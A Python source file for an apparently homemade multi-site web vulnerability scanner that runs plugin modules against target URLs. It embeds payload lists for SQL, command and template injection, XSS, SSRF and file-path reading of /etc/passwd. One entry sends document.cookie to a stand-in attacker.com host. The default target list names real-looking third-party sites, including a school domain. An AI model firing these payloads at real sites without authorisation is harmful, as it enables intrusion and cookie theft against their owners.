import re
import sys
import time
import json
import random
import string
import socket
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import concurrent.futures
import os
import importlib
import inspect
import logging
from urllib.parse import urlparse, parse_qs, urljoin, quote_plus
from bs4 import BeautifulSoup
from tqdm import tqdm

from config import load_config

# Try to import optional dependencies
try:
    import dns.resolver
    DNS_RESOLVER_AVAILABLE = True
except ImportError:
    DNS_RESOLVER_AVAILABLE = False

# Added optional websocket import
try:
    import websocket
    WEBSOCKET_AVAILABLE = True
except ImportError:
    WEBSOCKET_AVAILABLE = False

# Add PySocks for SOCKS proxy support
try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False
    logging.warning("PySocks library not installed. SOCKS proxy support will be limited.")
    logging.warning("Install using: pip install PySocks")

# Define the path to the modules directory relative to this script
MODULES_DIR = 'modules'
# Define the preferred order of function names to look for
SCAN_FUNCTION_NAMES = ['scan', 'run_scan', 'check']

# --- Logging Configuration ---
logging.basicConfig(
    level=logging.INFO, 
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
# Suppress excessive logging from requests/urllib3 if needed
logging.getLogger("requests").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)
# ---------------------------


class SecurityScanner:
    """
    Comprehensive security scanner that checks for various vulnerabilities,
    misconfigurations, and security issues in web applications.
    Utilizes individual modules (dynamically discovered) for specific checks.
    """

    def __init__(self, user_agent=None, proxy=None, timeout=10, max_threads=10, verbose=False, max_retries=15, backoff_factor=0.5):
        """
        Initialize the security scanner.

        Args:
            user_agent (str): Custom User-Agent for requests
            proxy (dict): Proxy configuration (e.g., {'http': 'http://127.0.0.1:8080'} or 
                                              {'http': 'socks5://user:pass@host:port'})
            timeout (int): Request timeout in seconds
            max_threads (int): Maximum number of concurrent threads (Note: Currently for future use)
            verbose (bool): Enable verbose output
            max_retries (int): Maximum number of retry attempts for failed requests
            backoff_factor (float): Backoff factor for retry delay calculation (retry_delay = backoff_factor * (2 ** (retry_num)))
        """
        self.user_agent = user_agent or 'SecurityScanner/1.0 (+http://example.com/bot)'
        self.proxy = proxy
        self.timeout = timeout
        self.max_threads = max_threads
        self.verbose = verbose
        self.max_retries = max_retries
        self.backoff_factor = backoff_factor

        # Setup session with default headers
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        })

        # Configure retry mechanism
        self._configure_retries()

        # Configure proxy if provided
        if self.proxy:
            self._configure_proxy()

        # Payloads might still be useful for modules that need them internally
        self.payloads = self._load_payloads()

        # Configuration dictionary (passed to modules)
        self.config = {
            'user_agent': self.user_agent,
            'proxy': self.proxy,
            'timeout': self.timeout,
            'verbose': self.verbose,
            'max_retries': self.max_retries,
            'backoff_factor': self.backoff_factor
        }

    def _configure_retries(self):
        """
        Configure the session to use retry logic for failed requests.
        """
        # Define retry strategy
        retry_strategy = Retry(
            total=self.max_retries,
            backoff_factor=self.backoff_factor,
            status_forcelist=[429, 500, 502, 503, 504],  # Retry on these HTTP status codes
            allowed_methods=["GET", "POST", "HEAD", "OPTIONS"],  # Retry for these HTTP methods
            respect_retry_after_header=True,  # Honor Retry-After header if present
            connect=True,  # Retry on connection errors
            read=True,     # Retry on read errors
            raise_on_redirect=False, # Don't raise on redirect
            raise_on_status=True     # Raise on status
        )
        # Mount the retry adapter to both HTTP and HTTPS
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        if self.verbose:
            logging.info(f"Configured request retry strategy: max_retries={self.max_retries}, backoff_factor={self.backoff_factor}")

    def _configure_proxy(self):
        """
        Configure the session to use the specified proxy.
        Handles both HTTP and SOCKS proxies.
        """
        if not self.proxy:
            return
            
        # Basic validation
        if not isinstance(self.proxy, dict):
            logging.warning(f"Invalid proxy configuration format: {self.proxy}")
            return
            
        # Check for SOCKS proxy
        for protocol in ['http', 'https']:
            if protocol in self.proxy and self.proxy[protocol].startswith('socks'):
                if not SOCKS_AVAILABLE:
                    logging.warning(f"SOCKS proxy specified but PySocks not installed. SOCKS support may be limited.")
                # requests will automatically use PySocks if installed
                
        # Apply proxy settings to session
        self.session.proxies.update(self.proxy)
        if self.verbose:
            proxy_urls = [f"{k}: {v.split('@')[-1] if '@' in v else v}" for k, v in self.proxy.items()]
            logging.info(f"Using proxy: {', '.join(proxy_urls)}")

    def _load_payloads(self):
        """Load test payloads for various vulnerability checks.
           Modules might define their own, but this provides a central place."""
        # (Keeping existing payloads for potential use by modules)
        return {
            "sql_injection": [ "' OR '1'='1", "' OR 1=1 --", "' OR 1=1 #", "') OR ('1'='1", "' UNION SELECT 1,2,3 --", "' UNION SELECT null,table_name,null FROM information_schema.tables --", "admin'--", "1'; DROP TABLE users--" ],
            "nosql_injection": [ '{"$gt": ""}', '{"$ne": null}', '{"$where": "sleep(1000)"}', '{"username": {"$regex": "^admin"}}', '{"$or": [{"username": "admin"}, {"username": "administrator"}]}' ],
            "command_injection": [ "; ls -la", "| cat /etc/passwd", "`cat /etc/passwd`", "$(cat /etc/passwd)", "& ping -c 3 localhost", "%0a ping -c 3 localhost", "'; ping -c 3 localhost; '" ],
            "xss": [ "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "javascript:alert('XSS')", "<svg onload=alert('XSS')>", "\"> <script>alert('XSS')</script>", "'-alert('XSS')-'", "<iframe src=\"javascript:alert('XSS')\"></iframe>", "<body onload=alert('XSS')>", "<a href=\"javascript:alert('XSS')\">Click me</a>" ],
            "csrf": [ "<img src=x onerror=\"fetch('http://attacker.com/steal?cookie='+document.cookie)\">", "<form action=\"https://victim-site.com/transfer\" method=\"POST\" id=\"csrf-form\"><input type=\"hidden\" name=\"amount\" value=\"1000\"><input type=\"hidden\" name=\"recipient\" value=\"attacker\"></form><script>document.getElementById('csrf-form').submit()</script>" ],
            "ssrf": [ "http://localhost/", "http://localhost:22/", "http://127.0.0.1/", "http://[::1]/", "http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/", "gopher://127.0.0.1:25/xHELO%20localhost" ],
            "lfi": [ "../../../etc/passwd", "..%252f..%252f..%252fetc/passwd", "/etc/passwd", "....//....//....//etc/passwd", "../../../../../../../../etc/passwd", "../../../../../../../../../../etc/passwd%00", "php://filter/convert.base64-encode/resource=../config.php" ],
            "ssti": [ "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}", "${self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}" ],
            "security_headers": [ "Content-Security-Policy", "X-XSS-Protection", "X-Content-Type-Options", "X-Frame-Options", "Strict-Transport-Security", "Referrer-Policy", "Permissions-Policy", "Cache-Control", "Clear-Site-Data" ],
            "admin_paths": [ "/admin", "/administrator", "/admin.php", "/wp-admin", "/administrator/index.php", "/dashboard", "/backend", "/control", "/management", "/console", "/cms", "/panel", "/manage", "/system", "/server-status", "/server-info", "/.git", "/.svn" ]
        }

    def scan_website(self, url):
        """
        Perform a comprehensive security scan on a website using dynamically discovered modules.

        Args:
            url (str): The URL to scan

        Returns:
            dict: Scan results including findings, skipped modules, errors, and recommendations
        """
        logging.info(f"Starting comprehensive security scan for: {url}")
        start_time = time.time()

        results = {
            "url": url,
            "scan_timestamp": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
            "findings": {},
            "skipped": [],
            "module_errors": {},
            "summary": {
                "critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0
            },
            "scan_time_seconds": 0,
            "error": None,
            "retry_info": None  # Will store retry information if relevant
        }

        initial_response = None
        soup = None
        headers = {}
        domain = None
        ws_url = None

        try:
            # Initial connection to check if site is reachable
            logging.info(f"Performing initial request to {url} (with auto-retry)...")
            retry_count = 0
            retry_succeeded = False
            last_error = None

            # Automatic retry will be handled by the session's retry configuration
            try:
                initial_response = self.session.get(url, timeout=self.timeout, allow_redirects=True)
                    
                initial_response.raise_for_status()  # Raise HTTPError for bad responses
                retry_succeeded = True
                logging.info(f"Initial request successful (Status: {initial_response.status_code})")
            except (requests.RequestException, IOError) as e:
                last_error = e
                # The retry logic in the session may have already attempted multiple times
                # We'll check retry history if available
                history = getattr(initial_response, 'history', []) if initial_response else []
                retry_count = len(history)
                results["retry_info"] = {
                    "attempts": retry_count,
                    "success": False,
                    "error": str(last_error)
                }
                logging.error(f"Initial request failed after {retry_count} retries: {last_error}")
                raise  # Re-raise the exception for the outer try/except to handle

            if retry_count > 0:
                # If request succeeded after retries, note it
                results["retry_info"] = {
                    "attempts": retry_count,
                    "success": True
                }
                logging.info(f"Request succeeded after {retry_count} retries")

            if initial_response.history:
                original_url = url
                url = initial_response.url  # Update URL if redirected
                results["url"] = url
                results["initial_redirect"] = {"from": original_url, "to": url, "status_code": initial_response.history[0].status_code}
                logging.info(f"Redirected to: {url}")

            # Extract domain information and prepare WS URL
            parsed_url = urlparse(url)
            domain = parsed_url.netloc
            results["domain"] = domain
            results["scheme"] = parsed_url.scheme

            if parsed_url.scheme in ['http', 'https']:
                ws_scheme = 'ws' if parsed_url.scheme == 'http' else 'wss'
                ws_url = f"{ws_scheme}://{domain}{parsed_url.path or '/'}"
                if self.verbose: logging.debug(f"Potential WebSocket URL: {ws_url}")

            # Parse the base HTML and get headers
            if 'html' in initial_response.headers.get('Content-Type', ''):
                soup = BeautifulSoup(initial_response.text, 'html.parser')
                logging.info("Successfully parsed HTML content.")
            else:
                logging.info("Response is not HTML, skipping HTML parsing.")
                soup = None  # Ensure soup is None if not HTML
                
            headers = initial_response.headers

            # Perform all security checks using modules
            logging.info("Starting security checks via dynamically discovered modules...")
            # Pass necessary context to the checks method
            check_results = self._run_all_checks(
                target_url=url,
                domain=domain,
                ws_url=ws_url,
                session=self.session,
                soup=soup,
                response=initial_response,
                headers=headers,
                config=self.config  # Pass the scanner config
            )
            results["findings"] = check_results.get("findings", {})
            results["skipped"] = check_results.get("skipped", [])
            results["module_errors"] = check_results.get("errors", {})

            # Count findings by severity
            for category_findings in results["findings"].values():
                if isinstance(category_findings, list):
                    for finding in category_findings:
                        if isinstance(finding, dict):
                            severity = finding.get("severity", "info").lower()
                            if severity in results["summary"]:
                                results["summary"][severity] += 1

        except requests.exceptions.RetryError as e:
            results["error"] = f"Maximum retries exceeded: {str(e)}"
            logging.error(f"Scan setup failed: {results['error']}")
        except requests.exceptions.Timeout as e:
            results["error"] = f"Request timed out: {str(e)}"
            logging.error(f"Scan setup failed: {results['error']}")
        except requests.exceptions.ConnectionError as e:
            results["error"] = f"Connection error: {str(e)}"
            logging.error(f"Scan setup failed: {results['error']}")
        except requests.exceptions.RequestException as e:
            results["error"] = f"Initial request failed: {str(e)}"
            logging.error(f"Scan setup failed: {results['error']}")
        except Exception as e:
            results["error"] = f"General scan setup error: {str(e)}"
            logging.error(f"Scan setup failed: {results['error']}", exc_info=self.verbose)
        finally:
            # Calculate total scan time
            results["scan_time_seconds"] = round(time.time() - start_time, 2)
            if results["error"]:
                logging.info(f"Scan failed after {results['scan_time_seconds']} seconds")
            else:
                logging.info(f"Scan completed in {results['scan_time_seconds']} seconds")

        return results  # Return the full results dictionary

    def _run_all_checks(self, target_url, domain, ws_url, session, soup, response, headers, config):
        """
        Run all security checks by dynamically discovering and executing modules.
        """
        all_findings = {}
        skipped_modules = []
        modules_with_errors = {}

        # Ensure the modules directory is in the Python path if not already handled
        module_dir_path = os.path.abspath(MODULES_DIR)
        if module_dir_path not in sys.path:
             parent_dir = os.path.dirname(module_dir_path) 
             if parent_dir not in sys.path:
                 sys.path.insert(0, parent_dir) 

        if not os.path.isdir(MODULES_DIR):
            logging.error(f"Modules directory '{MODULES_DIR}' not found.")
            return {"findings": {}, "skipped": [], "errors": {"setup": f"Modules directory '{MODULES_DIR}' not found."}}

        module_filenames = [f for f in os.listdir(MODULES_DIR) if f.endswith('.py') and f != '__init__.py']
        
        for filename in tqdm(sorted(module_filenames), desc="Scanning Modules", unit="module", leave=False):
            module_name = filename[:-3]
            module_package_name = os.path.basename(MODULES_DIR)
            module_full_path = f"{module_package_name}.{module_name}"

            if self.verbose: logging.debug(f"Processing Module: {module_name} ({module_full_path})")

            module = None
            target_func = None
            func_name_found = None

            try:
                module = importlib.import_module(module_full_path)

                for func_name in SCAN_FUNCTION_NAMES:
                    if hasattr(module, func_name):
                        target_func = getattr(module, func_name)
                        func_name_found = func_name
                        break

                if target_func:
                    sig = inspect.signature(target_func)
                    params = sig.parameters
                    num_params = len(params)
                    param_names = list(params.keys())

                    findings = None
                    try:
                        # Case 1: Simple scan(url) or scan(domain) etc.
                        if num_params == 1:
                            param_name = param_names[0]
                            if module_name in ['open_port', 'subdomain_takeover']:
                                if self.verbose: logging.debug(f"  Calling {module_name}.{func_name_found}({param_name}='{domain}')...")
                                findings = target_func(domain)
                            elif module_name == 'websocket_injection':
                                if not WEBSOCKET_AVAILABLE:
                                    if self.verbose: logging.debug(f"  Skipping {module_name}: websocket-client library not installed.")
                                    skipped_modules.append(f"{module_name} (websocket-client missing)")
                                elif ws_url:
                                    if self.verbose: logging.debug(f"  Calling {module_name}.{func_name_found}({param_name}='{ws_url}')...")
                                    findings = target_func(ws_url)
                                else:
                                    if self.verbose: logging.debug(f"  Skipping {module_name}: Could not determine WebSocket URL from {target_url}")
                                    skipped_modules.append(f"{module_name} (WebSocket URL needed)")
                            else:
                                # Check if the module accepts more than one parameter
                                try:
                                    # Try calling with session parameter
                                    if self.verbose: logging.debug(f"  Calling {module_name}.{func_name_found}({param_name}='{target_url}', session=<Session>)...")
                                    findings = target_func(target_url, session=session)
                                except TypeError:
                                    # Fall back to calling with just URL
                                    if self.verbose: logging.debug(f"  Calling {module_name}.{func_name_found}({param_name}='{target_url}')...")
                                    findings = target_func(target_url)

                        # Case 2: Multi-argument 'check' function (like xss, login_page_discovery)
                        elif func_name_found == 'check' and num_params > 1:
                            # Determine required arguments for the specific function
                            required_args = {p.name for p in params.values() if p.default is inspect.Parameter.empty}
                            available_context = {
                                'session': session,
                                'base_url': target_url,
                                'url': target_url,
                                'target_url': target_url,
                                'soup': soup,
                                'response': response,
                                'headers': headers,
                                'config': config,
                                'payloads': getattr(module, 'PAYLOADS', []) # Provide module payloads if defined
                            }
                            
                            # Check if all required args are available in our context
                            can_call = True
                            call_args = {}
                            missing_context = []
                            for req_arg in required_args:
                                if req_arg in available_context and available_context[req_arg] is not None:
                                    call_args[req_arg] = available_context[req_arg]
                                # Special check for soup (might be None if not HTML)
                                elif req_arg == 'soup' and 'soup' in available_context: 
                                     call_args['soup'] = available_context['soup'] # Pass None if it's None
                                else:
                                     # Handle case where a necessary context item is None (e.g., initial request failed)
                                     if req_arg not in available_context or available_context.get(req_arg) is None:
                                          can_call = False
                                          missing_context.append(req_arg)
                                          break # No point checking further if one is missing
                            
                            if can_call:
                                if self.verbose: logging.debug(f"  Calling {module_name}.{func_name_found} with args: {list(call_args.keys())}...")
                                try:
                                     # Call function dynamically with the prepared arguments
                                     findings = target_func(**call_args)
                                except TypeError as te:
                                     logging.error(f"TypeError calling {module_name}.{func_name_found}: {te}. Check function signature and arguments.")
                                     modules_with_errors[module_name] = f"TypeError: {te}"
                                     findings = None # Ensure error state
                            else:
                                reason = f"(Missing context: {', '.join(missing_context)})"
                                if self.verbose: logging.debug(f"  Skipping {module_name}: Required context not available. {reason}")
                                skipped_modules.append(f"{module_name} {reason}")

                        # Case 3: Other unrecognized signatures
                        else:
                            sig_repr = f"{func_name_found}{sig}"
                            if self.verbose: logging.debug(f"  Skipping {module_name}: Unrecognized function signature: {sig_repr}")
                            skipped_modules.append(f"{module_name} (Unrecognized signature: {sig_repr})")

                    except Exception as e:
                        logging.error(f"Error running module {module_name}.{func_name_found}: {type(e).__name__}: {e}", exc_info=self.verbose)
                        modules_with_errors[module_name] = str(e)
                        findings = None

                    # Process results
                    if findings is not None:
                        if findings:
                            if self.verbose: logging.debug(f"  Findings from {module_name}: {len(findings)} items")
                            all_findings[module_name] = findings
                        else:
                            if self.verbose: logging.debug(f"  No findings from {module_name}.")
                            all_findings[module_name] = []

                else:
                    logging.warning(f"Skipping module {module_name}: No suitable scan function ({', '.join(SCAN_FUNCTION_NAMES)}) found.")
                    skipped_modules.append(f"{module_name} (No scan function)")

            except ImportError as e:
                logging.error(f"Error importing module {module_name}: {e}", exc_info=self.verbose)
                modules_with_errors[module_name] = f"Import Error: {e}"
                skipped_modules.append(f"{module_name} (Import Error)")
            except Exception as e:
                logging.error(f"Unexpected error processing module {module_name}: {type(e).__name__}: {e}", exc_info=self.verbose)
                modules_with_errors[module_name] = f"Unexpected Error: {e}"
                skipped_modules.append(f"{module_name} (Unexpected Error)")

        return {
            "findings": all_findings,
            "skipped": skipped_modules,
            "errors": modules_with_errors
        }



def scan_website_security(url, config=None):
    """
    Scan a website for security vulnerabilities using the modular SecurityScanner.

    Args:
        url (str): URL of the website to scan
        config (dict): Configuration options (e.g., user_agent, proxy, timeout, verbose)

    Returns:
        dict: Security scan results
    """
    config = config or {}
    # Use the verbose flag from config to potentially set logging level
    is_verbose = config.get('verbose_security_scan', False)
    if is_verbose:
        logging.getLogger().setLevel(logging.DEBUG) # Set root logger to DEBUG if verbose
    else:
         logging.getLogger().setLevel(logging.INFO) # Otherwise default to INFO

    try:
        logging.info("Initializing SecurityScanner...")
        
        # Get retry settings from config
        max_retries = config.get('max_retries', 15)
        backoff_factor = config.get('backoff_factor', 0.5)
        
        # Format proxy correctly for SecurityScanner
        proxy_dict = None
        if config.get('proxy', {}).get('enabled', False):
            proxy_type = config.get('proxy', {}).get('type', '').lower()
            proxy_url = config.get('proxy', {}).get('url')
            
            if not proxy_url:
                # Build proxy URL from components
                proxy_host = config.get('proxy', {}).get('host')
                proxy_port = config.get('proxy', {}).get('port')
                proxy_username = config.get('proxy', {}).get('username')
                proxy_password = config.get('proxy', {}).get('password')
                
                if proxy_host and proxy_port:
                    if proxy_username and proxy_password:
                        proxy_url = f"{proxy_type}://{proxy_username}:{proxy_password}@{proxy_host}:{proxy_port}"
                    else:
                        proxy_url = f"{proxy_type}://{proxy_host}:{proxy_port}"
            
            if proxy_url:
                proxy_dict = {
                    'http': proxy_url,
                    'https': proxy_url
                }
                logging.info(f"Using proxy configuration: {proxy_url.split('@')[-1] if '@' in proxy_url else proxy_url}")
        
        # Initialize the scanner with config from the caller (likely scanner.py)
        scanner = SecurityScanner(
            user_agent=config.get('user_agent'),
            proxy=proxy_dict,  # Pass the properly formatted proxy dictionary
            timeout=config.get('scan_timeout', 10),
            verbose=is_verbose, # Pass verbosity flag to scanner instance
            max_retries=max_retries,
            backoff_factor=backoff_factor
        )

        results = scanner.scan_website(url) # Call the main scan method

        # --- Format results summary for display (KEEPING as console output) ---
        print("\n--- Security Scan Summary ---") # Add newline for separation
        if not results.get('error'):
            summary = results.get('summary', {})
            # Print summary including errors/skipped
            error_count = len(results.get('module_errors', {}))
            skipped_count = len(results.get('skipped', []))
            print(f"  Target URL: {results.get('url')}")
            print(f"  Scan Time : {results.get('scan_time_seconds'):.2f} seconds")
            print(f"  Findings  : Critical: {summary.get('critical', 0)}, High: {summary.get('high', 0)}, Medium: {summary.get('medium', 0)}, Low: {summary.get('low', 0)}, Info: {summary.get('info', 0)}")
            print(f"  Issues    : Modules with Errors: {error_count}, Skipped Modules: {skipped_count}")
            # ... (rest of summary printing remains the same) ...
            # Print top issues if any findings exist
            all_findings = []
            if isinstance(results.get('findings'), dict):
                for module_name, findings_list in results.get('findings', {}).items():
                    if isinstance(findings_list, list):
                        all_findings.extend(findings_list)

            if all_findings:
                 # Filter out potential error dictionaries before sorting
                valid_findings = [f for f in all_findings if isinstance(f, dict) and 'severity' in f]

                # Sort findings by severity
                severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
                top_findings = sorted(valid_findings, key=lambda x: severity_order.get(x.get("severity", "info").lower(), 999))[:5] # Show top 5

                if top_findings:
                    print("\n  Top Issues Found:")
                    for i, finding in enumerate(top_findings, 1):
                        sev = finding.get('severity', 'Info').upper()
                        name = finding.get('name', 'Unnamed Finding')
                        desc = finding.get('description', '')[:80] # Truncate description
                        print(f"    {i}. [{sev}] {name} - {desc}...")
            elif not results.get('module_errors') and not results.get('skipped'):
                 print("\n  No findings reported by modules.")

        else:
            # Error occurred during scan setup or initial request
            print(f"\n  Security scan error: {results['error']}")

        # Optionally print detailed errors/skipped modules if verbose
        if is_verbose: # Check the original verbose flag
             if results.get('module_errors'):
                 print("\n  Module Errors Detail:")
                 for mod, err in results['module_errors'].items():
                     print(f"    - {mod}: {err}")
             if results.get('skipped'):
                 print("\n  Skipped Modules Detail:")
                 # Use set for unique reasons
                 for reason in sorted(list(set(results['skipped']))):
                      print(f"    - {reason}")
        print("---------------------------") # Footer for summary
        # ---------------------------------------------------------------

        return results # Return the full results dictionary

    except Exception as e:
        # Catch errors during SecurityScanner instantiation or initial call
        import traceback
        logging.critical(f"Fatal error during security scan setup: {e}", exc_info=True)
        # Print user-friendly error message
        print(f"\nFATAL ERROR: Could not perform security scan due to: {e}")
        print("Please check logs for more details.")
        return {"error": f"Fatal scanner error: {str(e)}", "findings": {}, "summary": {}, "skipped": [], "module_errors": {}} 

# --- Helper Function to Save Results ---
def save_scan_results(result, directory="scan_results_with_login"):
    """
    Saves the scan result dictionary to a JSON file.

    Args:
        result (dict): The scan result dictionary for a single URL.
        directory (str): The directory to save the file in.
    """
    if not result or 'url' not in result:
        logging.error("Cannot save result: Invalid result dictionary provided.")
        return

    target_url = result['url']
    try:
        # Create a reasonably safe filename from the URL
        parsed_url = urlparse(target_url)
        # Use netloc (domain) and replace dots/colons for filename
        filename_base = parsed_url.netloc.replace('.', '_').replace(':', '_p')
        # Add a part of the path if it exists, replacing slashes
        path_part = parsed_url.path.replace('/', '_').strip('_')
        if path_part:
             filename_base += '_' + path_part[:30] # Limit path part length
        
        filename = f"{filename_base}.json"
        filepath = os.path.join(directory, filename)

        # Create the directory if it doesn't exist
        os.makedirs(directory, exist_ok=True)

        # Save the result as JSON
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(result, f, indent=4, ensure_ascii=False)
        logging.info(f"Saved scan results with login findings for {target_url} to {filepath}")

    except Exception as e:
        logging.error(f"Failed to save scan results for {target_url} to file: {e}")

# --- Function for Multi-Threaded Scanning ---
def scan_multiple_websites(urls, config):
    """
    Scans multiple websites concurrently using a thread pool.
    Saves results to a file if login pages are potentially found.
    """
    max_workers = config.get('max_threads', 10) # Use max_threads from config
    all_results = {}
    start_time = time.time()

    
    if max_workers >= 2:
        logging.info(f"Starting concurrent scan for {len(urls)} websites using up to {max_workers} threads...")
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_url = {executor.submit(scan_website_security, url, config): url for url in urls}
            
            for future in tqdm(concurrent.futures.as_completed(future_to_url), total=len(urls), desc="Overall Progress", unit="site"):
                url = future_to_url[future]
                try:
                    result = future.result()
                    all_results[url] = result
                    
                    # --- Check for login page findings and save if found --- 
                    findings = result.get('findings', {})
                    login_findings = findings.get('login_page_discovery', []) # Use the module name as key
                    if login_findings: # Check if the list is not empty
                        save_scan_results(result) # Save the entire result dictionary
                    # ----------------------------------------------------

                except Exception as exc:
                    logging.error(f'URL {url} generated an exception during scan: {exc}', exc_info=config.get('verbose_security_scan', False))
                    all_results[url] = {"error": f"Scan failed with exception: {exc}", "findings": {}, "summary": {}, "skipped": [], "module_errors": {}}
    else:
        for url in tqdm(urls, desc="Overall Progress", unit="site"):
            result = scan_website_security(url, config)
            all_results[url] = result
            

    total_time = time.time() - start_time
    logging.info(f"Finished scanning all {len(urls)} websites in {total_time:.2f} seconds.")
    
    return all_results 


if __name__ == "__main__":
    # --- Updated Main Block for Multiple URLs ---
    if len(sys.argv) < 2:
        target_urls = ["hhs.hillsidek12.org", "www.firstrepubliclounge.com", "http://contractordirectwindows.com/", "https://hhs.hillsidek12.org"]
    else:
        target_urls = sys.argv[1:]
    valid_urls = []
    for target in target_urls:
        if not target.startswith('http://') and not target.startswith('https://'):
             logging.warning(f"Skipping invalid URL (must start with http:// or https://): {target}")
             # Optionally exit if any URL is invalid, or just skip
             # print(f"Error: Invalid URL provided: {target}")
             # sys.exit(1)
        else:
            valid_urls.append(target)

    if not valid_urls:
        print("Error: No valid target URLs provided.")
        sys.exit(1)

    config = load_config()
    
    # Set logging level based on config before starting scans
    if config.get('verbose_security_scan', False):
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    # Run the concurrent scans
    scan_results = scan_multiple_websites(valid_urls, config)
    
    # Optional: Add code here to process/summarize the aggregated 'scan_results' dictionary if needed
    # For example, save all findings to a combined report file.
    logging.info("Multi-site scan process complete.")
    # ------------------------------------------------ 